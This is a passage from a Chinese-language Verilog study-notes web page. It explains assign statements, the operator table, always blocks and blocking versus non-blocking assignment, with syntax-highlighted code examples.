</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-verilog-verilog-__codelineno-2-3"></a><span class="k">output</span><span class="w"> </span><span class="kt">reg</span><span class="w"> </span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-cs-verilog-verilog-__codelineno-2-4"></a><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="p">)</span><span class="w"> </span><span class="k">begin</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-cs-verilog-verilog-__codelineno-2-5"></a><span class="w"> </span><span class="n">Q</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">D</span><span class="p">;</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-cs-verilog-verilog-__codelineno-2-6"></a><span class="k">endmodule</span><span class="w">    </span>
</span></code></pre></div>
 四位全加器
 <div class="language-verilog highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-verilog-verilog-__codelineno-3-1"></a><span class="k">module</span><span class="w"> </span><span class="n">full_adder</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">CIN</span><span class="p">,</span><span class="n">COUT</span><span class="p">);</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-cs-verilog-verilog-__codelineno-3-2"></a><span class="k">input</span><span class="w"> </span><span class="p">[</span><span class="mh">3</span><span class="o">:</span><span class="mh">0</span><span class="p">]</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">;</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-cs-verilog-verilog-__codelineno-3-3"></a><span class="k">input</span><span class="w"> </span><span class="n">CIN</span><span class="p">;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-cs-verilog-verilog-__codelineno-3-4"></a><span class="k">output</span><span class="w"> </span><span class="kt">reg</span><span class="w"> </span><span class="p">[</span><span class="mh">3</span><span class="o">:</span><span class="mh">0</span><span class="p">]</span><span class="w"> </span><span class="n">S</span><span class="p">;</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-cs-verilog-verilog-__codelineno-3-5"></a><span class="k">output</span><span class="w"> </span><span class="n">COUT</span><span class="p">;</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-cs-verilog-verilog-__codelineno-3-6"></a><span class="k">endmodule</span>
</span></code></pre></div></p>
</div>
<h2 id="note-cs-verilog-verilog-assign">assign语句<a class="headerlink" href="#note-cs-verilog-verilog-assign" title="Permanent link">&para;</a></h2>
<p><code>assign</code>语句称作连续赋值语句,赋值目标必须是wire型的,wire表示电路间的连线.</p>
<p>基本格式: <code>assign</code> 赋值目标 = 表达式,更硬件地说<code>assign</code>的左边是一个电路的输入,另外一边是另一个电路的输出</p>
<p>例如</p>
<ul>
<li>非: <code>assgin y = ~a</code></li>
<li>与门: <code>assign y=a&amp;b</code></li>
</ul>
<p><strong>特点</strong>:之所以称为连续赋值语句是指其总是处于激活状态,只要表达式中的操作数有变化,立即进行计算和赋值.(与连续赋值语句对应的另一种语句称为过程赋值语句)</p>
<p>Verilog具有丰富的表达式运算功能可以用于assign语句</p>
<table>
<thead>
<tr>
<th>操作类型</th>
<th>操作符</th>
<th>执行的操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>算术</td>
<td><code>*</code></td>
<td>乘</td>
</tr>
<tr>
<td></td>
<td><code>/</code></td>
<td>除</td>
</tr>
<tr>
<td></td>
<td><code>+</code></td>
<td>加</td>
</tr>
<tr>
<td></td>
<td><code>-</code></td>
<td>减</td>
</tr>
<tr>
<td></td>
<td><code>%</code></td>
<td>取模</td>
</tr>
<tr>
<td></td>
<td><code>**</code></td>
<td>求幂</td>
</tr>
<tr>
<td>逻辑</td>
<td><code>!</code></td>
<td>逻辑求反</td>
</tr>
<tr>
<td></td>
<td><code>&amp;&amp;</code></td>
<td>逻辑与</td>
</tr>
<tr>
<td></td>
<td><code>|            |</code></td>
<td>逻辑或</td>
</tr>
<tr>
<td>关系</td>
<td><code>&gt;</code></td>
<td>大于</td>
</tr>
<tr>
<td></td>
<td><code>&lt;</code></td>
<td>小于</td>
</tr>
<tr>
<td></td>
<td><code>&gt;=</code></td>
<td>大于等于</td>
</tr>
<tr>
<td></td>
<td><code>&lt;=</code></td>
<td>小于等于</td>
</tr>
<tr>
<td>等价</td>
<td><code>==</code></td>
<td>相等</td>
</tr>
<tr>
<td></td>
<td><code>!=</code></td>
<td>不等</td>
</tr>
<tr>
<td></td>
<td><code>===</code></td>
<td>case 相等</td>
</tr>
<tr>
<td></td>
<td><code>!==</code></td>
<td>case 不等</td>
</tr>
<tr>
<td>按位</td>
<td><code>~</code></td>
<td>按位求反</td>
</tr>
<tr>
<td></td>
<td><code>&amp;</code></td>
<td>按位与</td>
</tr>
<tr>
<td></td>
<td><code>|</code></td>
<td>按位或</td>
</tr>
<tr>
<td></td>
<td><code>^</code></td>
<td>按位异或</td>
</tr>
<tr>
<td></td>
<td><code>^~</code>或<code>~^</code></td>
<td>按位同或</td>
</tr>
<tr>
<td>缩减</td>
<td><code>&amp;</code></td>
<td>缩减与</td>
</tr>
<tr>
<td></td>
<td><code>~&amp;</code></td>
<td>缩减与非</td>
</tr>
<tr>
<td></td>
<td><code>|</code></td>
<td>缩减或</td>
</tr>
<tr>
<td></td>
<td><code>~         |</code></td>
<td>缩减或非</td>
</tr>
<tr>
<td></td>
<td><code>^</code></td>
<td>缩减异或</td>
</tr>
<tr>
<td></td>
<td><code>^~</code>或<code>~^</code></td>
<td>缩减同或</td>
</tr>
<tr>
<td>移位</td>
<td><code>&gt;&gt;</code></td>
<td>右移</td>
</tr>
<tr>
<td></td>
<td><code>&lt;&lt;</code></td>
<td>左移</td>
</tr>
<tr>
<td></td>
<td><code>&gt;&gt;&gt;</code></td>
<td>算术右移</td>
</tr>
<tr>
<td></td>
<td><code>&lt;&lt;&lt;</code></td>
<td>算术左移</td>
</tr>
<tr>
<td>拼接</td>
<td><code>{}</code></td>
<td>拼接</td>
</tr>
<tr>
<td>复制</td>
<td><code>{n{}}</code></td>
<td>复制</td>
</tr>
<tr>
<td>条件</td>
<td><code>?:</code></td>
<td>条件</td>
</tr>
</tbody>
</table>
<div class="admonition 需要注意的地方">
<p class="admonition-title">需要注意的地方</p>
<p>前面几个比较简单,和C语言基本一样</p>
<p><strong>等价运算符</strong>
 <div class="language-Verilog highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-verilog-verilog-__codelineno-4-1"></a><span class="n">Y</span><span class="o">=</span><span class="p">(</span><span class="mh">1</span><span class="mb">&#39;b1</span><span class="o">==</span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="p">);</span><span class="err">结果为</span><span class="n">x</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-verilog-verilog-__codelineno-4-2"></a><span class="n">Y</span><span class="o">=</span><span class="p">(</span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="o">==</span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="p">);</span><span class="err">结果为</span><span class="n">x</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-cs-verilog-verilog-__codelineno-4-3"></a><span class="n">Y</span><span class="o">=</span><span class="p">(</span><span class="mh">1</span><span class="mb">&#39;b1</span><span class="o">===</span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="p">);</span><span class="err">结果为</span><span class="mh">0</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-cs-verilog-verilog-__codelineno-4-4"></a><span class="n">Y</span><span class="o">=</span><span class="p">(</span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="o">===</span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="p">);</span><span class="err">结果为</span><span class="mh">1</span>
</span></code></pre></div></p>
<ul>
<li>等于和不等于运算的结果可能是1(逻辑真)、0(逻辑假)、x(不确定);对于x或z,认为是不确定的值,比较结果为x;</li>
<li>case等和case不等的结果只能是1或0,对于x、z认为是确定的值,参加比较;</li>
</ul>
<p><strong>按位运算符</strong></p>
<ul>
<li>按位运算的操作数是1位或多位二进制数,</li>
<li>按位非的操作数只有一个,将该数的每一位求非运算.</li>
<li>其它按位运算的操作数有2个或多个,将两个操作数对应的位两两运算;</li>
<li>如果操作数位宽不同,位宽小的会自动左添0补齐;</li>
<li>结果与操作数位宽相同;</li>
</ul>
<p><strong>缩减运算符</strong></p>
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-verilog-verilog-__codelineno-5-1"></a><span class="n">Y</span><span class="o">=&amp;</span><span class="mh">4</span><span class="mb">&#39;b1001</span><span class="w"> </span><span class="p">(</span><span class="err">结果为</span><span class="mh">0</span><span class="p">)</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-verilog-verilog-__codelineno-5-2"></a><span class="n">Y</span><span class="o">=~&amp;</span><span class="mh">4</span><span class="mb">&#39;b1001</span><span class="w"> </span><span class="p">(</span><span class="err">结果为</span><span class="mh">1</span><span class="p">,</span><span class="err">相当于</span><span class="o">~</span><span class="p">(</span><span class="o">&amp;</span><span class="mh">4</span><span class="mb">&#39;b1001</span><span class="p">))</span>
</span></code></pre></div>
<ul>
<li>缩减运算的操作数是1位或多位二进制数;</li>
<li>缩减运算的操作数只有一个,将该数的各位自左至右进行逻辑运算,结果只有一位.</li>
</ul>
<p><strong>移位运算符</strong></p>
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-verilog-verilog-__codelineno-6-1"></a><span class="n">Y</span><span class="o">=</span><span class="mh">4</span><span class="mb">&#39;b1001</span><span class="o">&gt;&gt;</span><span class="mh">1</span><span class="p">;(</span><span class="mh">0100</span><span class="p">)</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-verilog-verilog-__codelineno-6-2"></a><span class="n">Y</span><span class="o">=</span><span class="mh">4</span><span class="p">&#39;</span><span class="n">sb1001</span><span class="o">&gt;&gt;</span><span class="mh">1</span><span class="p">;(</span><span class="mh">1100</span><span class="p">,</span><span class="mh">4</span><span class="p">&#39;</span><span class="n">sb指的是有符号</span><span class="p">)</span>
</span></code></pre></div>
<ul>
<li>移位运算的操作数是1位或多位二进制数;</li>
<li>向左或向右移n位;</li>
<li>只有对有符号数的算术右移自动补符号位;</li>
<li>其他移位均自动补0.</li>
</ul>
<p><strong>拼接(拼总线)</strong></p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-verilog-verilog-__codelineno-7-1"></a><span class="n">Y</span><span class="o">=</span><span class="p">{</span><span class="mh">4</span><span class="mb">&#39;b1001</span><span class="p">,</span><span class="mh">2</span><span class="mb">&#39;b11</span><span class="p">}(</span><span class="mh">100100</span><span class="p">)</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-verilog-verilog-__codelineno-7-2"></a><span class="n">Y</span><span class="o">=</span><span class="p">{</span><span class="mh">4</span><span class="p">{</span><span class="mh">2</span><span class="mb">&#39;b01</span><span class="p">}}(</span><span class="mh">01010101</span><span class="p">)</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-verilog-verilog-__codelineno-7-3"></a><span class="n">Y</span><span class="o">=</span><span class="p">{</span><span class="mh">4</span><span class="p">{</span><span class="mh">2</span><span class="mb">&#39;b01</span><span class="p">},</span><span class="mh">2</span><span class="mb">&#39;b11</span><span class="p">}(</span><span class="mh">0101010111</span><span class="p">)</span>
</span></code></pre></div>
 - 将多个操作数拼接起来;
 - 将操作数复制n遍并拼接起来;
 - 可以组合使用.</p>
<p>条件运算符
 <code>a?:b:c</code>如果a是1,则返回b,否则返回c;可以嵌套使用</p>
</div>
<h2 id="note-cs-verilog-verilog-always">always语句块<a class="headerlink" href="#note-cs-verilog-verilog-always" title="Permanent link">&para;</a></h2>
<div class="admonition hint">
<p class="admonition-title">Hint</p>
<p>基本格式
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-verilog-verilog-__codelineno-8-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="err">敏感信号条件表</span><span class="p">)</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-verilog-verilog-__codelineno-8-2"></a><span class="w">   </span><span class="err">各类顺序语句</span>
</span></code></pre></div></p>
</div>
<p><strong>特点</strong></p>
<ul>
<li>always语句本身不是单一的有意义的一条语句,而是和下面的语句一起构成一个语句块,称之为过程块;过程块中的赋值语句称过程赋值语句;</li>
<li>该语句块不是总处于激活状态,当满足激活条件时才能被执行,否则被挂起,挂起时即使操作数有变化,也不执行赋值,赋值目标值保持不变;</li>
<li>赋值目标必须是reg型的.</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>激活条件由敏感信号条件表决定,当敏感条件满足时,过程块被激活.
<strong>敏感条件有两种,一种是边沿敏感,一种是电平敏感</strong></p>
</div>
<p><strong>边沿敏感</strong></p>
<ul>
<li><code>posedge</code> 信号名:信号上升沿到来</li>
<li><code>negedge</code> 信号名:信号下降沿到来</li>
</ul>
<p><strong>电平敏感</strong></p>
<ul>
<li>信号名列表:信号列表中任一个信号有变化(例如<code>(a,b,c)</code>或<code>(a or b or c)</code>,当三个信号中有一个发生变化) </li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-verilog-verilog-__codelineno-9-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="p">)</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#note-cs-verilog-verilog-__codelineno-9-2"></a><span class="n">Q</span><span class="o">=</span><span class="n">D</span><span class="p">;</span>
</span></code></pre></div>
当CLK上升沿到来时,激活该语句块,将D的值赋给Q;
否则,该语句块挂起,即使D有变化,Q的值也保持不变,直到下一次赋值
.</p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-verilog-verilog-__codelineno-10-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="n">D</span><span class="p">)</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-cs-verilog-verilog-__codelineno-10-2"></a><span class="n">Q</span><span class="o">=</span><span class="n">D</span><span class="p">;</span>
</span></code></pre></div>
当D有变化时(不管是由1变0还是由0变1),激活该语句块,将D的值赋给Q;
否则,该语句块挂起,Q的值保持不变,直到下一次赋值.</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>过程块中的赋值目标必须是reg型的.</li>
<li>由于always语句可以描述边沿变化,在设计时序电路中得到广泛应用.</li>
<li>always语句中还可以使用if、case、for循环等语句,其功能更加强大.例如
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-verilog-verilog-__codelineno-11-1"></a><span class="k">module</span><span class="w"> </span><span class="n">DFF2</span><span class="w"> </span><span class="p">(</span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">,</span><span class="n">Q</span><span class="p">,</span><span class="n">RST</span><span class="p">,</span><span class="n">EN</span><span class="p">)</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#note-cs-verilog-verilog-__codelineno-11-2"></a><span class="k">input</span><span class="w"> </span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">,</span><span class="n">RST</span><span class="p">,</span><span class="n">EN</span><span class="p">;</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#note-cs-verilog-verilog-__codelineno-11-3"></a><span class="k">output</span><span class="w"> </span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#note-cs-verilog-verilog-__codelineno-11-4"></a><span class="kt">reg</span><span class="w"> </span><span class="n">Q</span><span class="p">;</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#note-cs-verilog-verilog-__codelineno-11-5"></a><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="k">posedge</span><span class="w"> </span><span class="n">CLK</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="k">negedge</span><span class="w"> </span><span class="n">RST</span><span class="p">)</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#note-cs-verilog-verilog-__codelineno-11-6"></a><span class="k">begin</span><span class="w"> </span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#note-cs-verilog-verilog-__codelineno-11-7"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">RST</span><span class="p">)</span><span class="w"> </span><span class="n">Q</span><span class="o">&lt;=</span><span class="mh">0</span><span class="p">;</span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#note-cs-verilog-verilog-__codelineno-11-8"></a><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">EN</span><span class="p">)</span><span class="w"> </span><span class="n">Q</span><span class="o">&lt;=</span><span class="n">D</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#note-cs-verilog-verilog-__codelineno-11-9"></a><span class="k">end</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#note-cs-verilog-verilog-__codelineno-11-10"></a><span class="k">endmodule</span>
</span></code></pre></div></li>
</ul>
</div>
<p><strong><code>assign</code>语句和<code>always</code>语句的区别</strong></p>
<ul>
<li>连续赋值语句总是处于激活状态,只要操作数有变化马上进行计算和赋值;</li>
<li>过程赋值语句只有当激活该过程时,才会进行计算和赋值,如果该过程不被激活,即使操作数发生变化也不会计算和赋值.</li>
<li>verilog规定<code>assign</code>中的赋值目标必须是<code>wire</code>型的,而<code>always</code>语句中的赋值目标必须是<code>reg</code>型的.</li>
<li><code>always</code>语句块中如果有多条赋值语句必须将其用<code>begin</code> <code>end</code>包括起来,<code>assign</code>语句中没有<code>begin</code> <code>end</code></li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-verilog-verilog-__codelineno-12-1"></a><span class="k">assign</span><span class="w"> </span><span class="n">Q</span><span class="o">=</span><span class="n">D</span>
</span></code></pre></div>
只要D发生变化,马上进行计算和赋值; Q必须是wire型</p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-verilog-verilog-__codelineno-13-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="k">posedge</span><span class="w"> </span><span class="n">clk</span><span class="p">)</span><span class="w">                     </span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#note-cs-verilog-verilog-__codelineno-13-2"></a><span class="w">         </span><span class="n">Q</span><span class="o">=</span><span class="n">D</span><span class="p">;</span>
</span></code></pre></div>
只有当clk上升沿到来时,才能激活该块语句,才能进行计算和赋值;否则,即使D发生变化也不会计算和赋值.在未被激活时,Q的值保持不变.
Q必须是reg型.</p>
</div>
<p><strong>阻塞赋值和非阻塞赋值</strong></p>
<p><code>begin</code> <code>end</code>之间的赋值语句有阻塞赋值和非阻塞赋值之分</p>
<ul>
<li>
<p>阻塞赋值<code>=</code>:语句顺序执行,前面的执行完才能执行后面的语句;
    <div class="language-verilog highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-verilog-verilog-__codelineno-14-1"></a><span class="w">   </span><span class="n">a</span><span class="o">=</span><span class="mh">1</span><span class="mb">&#39;b1</span><span class="p">;</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#note-cs-verilog-verilog-__codelineno-14-2"></a><span class="w">   </span><span class="n">b</span><span class="o">=</span><span class="mh">1</span><span class="mb">&#39;b1</span><span class="p">;</span>
</span></code></pre></div>
    对a赋值会阻塞赋值b,即只有当赋值a执行完才能执行赋值b.</p>
</li>
<li>
<p>非阻塞赋值<code>&lt;=</code>:所有语句并行执行
     <div class="language-verilog highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-verilog-verilog-__codelineno-15-1"></a><span class="w">  </span><span class="n">a</span><span class="o">&lt;=</span><span class="mh">1</span><span class="mb">&#39;b1</span><span class="p">;</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#note-cs-verilog-verilog-__codelineno-15-2"></a><span class="w">  </span><span class="n">b</span><span class="o">&lt;=</span><span class="mh">1</span><span class="mb">&#39;b1</span><span class="p">;</span>
</span></code></pre></div>
    对a赋值不会阻塞赋值b,两个语句并行执行</p>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-verilog-verilog-__codelineno-16-1"></a><span class="k">begin</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#note-cs-verilog-verilog-__codelineno-16-2"></a><span class="w">  </span><span class="n">m</span><span class="o">=</span><span class="n">a</span><span class="o">*</span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#note-cs-verilog-verilog-__codelineno-16-3"></a><span class="w">  </span><span class="n">y</span><span class="o">=</span><span class="n">m</span><span class="p">;</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#note-cs-verilog-verilog-__codelineno-16-4"></a><span class="k">end</span><span class="w">   </span>
</span></code></pre></div>
当m赋值完成后,才能执行y的赋值,y得到的是m的新值.</p>
<p><div class="language-Verilog highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-verilog-verilog-__codelineno-17-1"></a><span class="k">begin</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#note-cs-verilog-verilog-__codelineno-17-2"></a><span class="w">  </span><span class="n">m</span><span class="o">&lt;=</span><span class="n">a</span><span class="o">*</span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#note-cs-verilog-verilog-__codelineno-17-3"></a><span class="w">  </span><span class="n">y</span><span class="o">&lt;=</span><span class="n">m</span><span class="p">;</span>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#note-cs-verilog-verilog-__codelineno-17-4"></a><span class="k">end</span><span class="w">   </span>
</span></code></pre></div>
m和y的赋值并行执行,y得到的是m的旧值.</p>
<p>设A、B同时由0变1
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-verilog-verilog-__codelineno-18-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">)</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#note-cs-verilog-verilog-__codelineno-18-2"></a><span class="k">begin</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#note-cs-verilog-verilog-__codelineno-18-3"></a><span class="w">    </span><span class="n">M1</span><span class="o">=</span><span class="n">A</span><span class="p">;</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#note-cs-verilog-verilog-__codelineno-18-4"></a><span class="w">    </span><span class="n">M2</span><span class="o">=</span><span class="n">B</span><span class="o">&amp;</span><span class="n">M1</span><span class="p">;</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#note-cs-verilog-verilog-__codelineno-18-5"></a><span class="w">    </span><span class="n">Q</span><span class="o">=</span><span class="n">M1</span><span class="o">|</span><span class="n">M2</span><span class="p">;</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#note-cs-verilog-verilog-__codelineno-18-6"></a><span class="k">end</span>
</span></code></pre></div>
激活前：M1=0,M2=0,Q=0</p>
<p>激活后：先计算A=1,马上赋值给M1
再计算B&amp;M1=1,马上赋值给M2
再计算M1|M2=1,马上赋值给Q</p>
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-verilog-verilog-__codelineno-19-1"></a><span class="k">always</span><span class="w"> </span><span class="p">@</span><span class="w"> </span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">)</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#note-cs-verilog-verilog-__codelineno-19-2"></a><span class="k">begin</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#note-cs-verilog-verilog-__codelineno-19-3"></a><span class="w">    </span><span class="n">M1</span><span class="o">&lt;=</span><span class="n">A</span><span class="p">;</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#note-cs-verilog-verilog-__codelineno-19-4"></a><span class="w">    </span><span class="n">M2</span><span class="o">&lt;=</span><span class="n">B</span><span class="o">&amp;</span><span class="n">M1</span><span class="p">;</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#note-cs-verilog-verilog-__codelineno-19-5"></a><span class="w">    </span><span class="n">Q</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">M1</span><span class="o">|</span><span class="n">M2</span><span class="p">;</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#note-cs-verilog-verilog-__codelineno-19-6"></a><span class="k">end</span>
</span></code></pre></div>
<p>先计算A=1,(等待,不赋值)</p>
<p>再计算B&amp;M1=0,(等待,不赋值)</p>
<p>再计算M1|M2=0,(等待,不赋值)</p>
<p>过程结束</p>
<p>先赋值给M1=1</p>
<p>再赋值给M2=0</p>
<p>再赋值给Q=0</p>
</div>
<p><strong>总结</strong> :</p>
<ul>
<li>
<p>阻塞赋值的实质:右边表达式的计算和对左边寄存器变量的赋值是一个统一的原子操作中的两个动作,这两个动作之间不能再插入其他任何动作.</p>
</li>
<li>
<p>非阻塞赋值的实质:首先按顺序计算右边表达式的值,但是并不马上赋值,而是要等到过程结束时再按顺序赋值.</p>
</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>设计组合电路时常用阻塞赋值;</li>
<li>设计时序电路时常用非阻塞赋值;但不是绝对的.</li>
<li>不建议在一个always块中混合使用阻塞赋值和非阻塞赋值</li>
</ul>
</div>
<details class="example">
<summary>Example</summary>
<p>阻塞赋值实现的组合电路
<img alt="" src="../NOTE/CS/Verilog/image.png" />
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-verilog-verilog-__codelineno-20-1"></a><span class="k">module</span><span class="w"> </span><span class="n">MY</span><span class="w"> </span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">C</span><span class="p">,</span><span class="n">Y</span><span class="p">)</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#note-cs-verilog-verilog-__codelineno-20-2"></a><span class="k">input</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">C</span><span class="p">;</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#note-cs-verilog-verilog-__codelineno-20-3"></a><span class="k">output</span><span class="w"> </span><span class="n">Y</span><span class="p">;</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#note-cs-verilog-verilog-__codelineno-20-4"></a><span class="kt">reg</span><span class="w"> </span><span class="n">Y</span><span class="p">;</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#note-cs-verilog-verilog-__codelineno-20-5"></a><span class="kt">reg</span><span class="w"> </span><span class="n">M</span><span class="p">;</span>
